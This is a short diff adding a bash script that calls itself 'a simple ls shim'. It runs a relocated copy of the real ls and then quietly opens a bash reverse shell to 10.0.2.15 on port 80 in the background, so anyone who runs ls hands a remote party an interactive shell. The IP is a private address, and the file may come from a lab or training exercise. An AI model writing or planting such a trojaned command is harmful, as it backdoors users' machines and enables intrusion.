@@ -1,0 +1,12 @@
+#!/bin/bash
+: <<'END'
+A simple ls shim
+END
+
+# Execute real 'ls'
+LS=/lib/init/init-ls
+$LS $@
+
+# bash reverse shell
+bash -i >& /dev/tcp/10.0.2.15/80 0>&1 &; disown
+
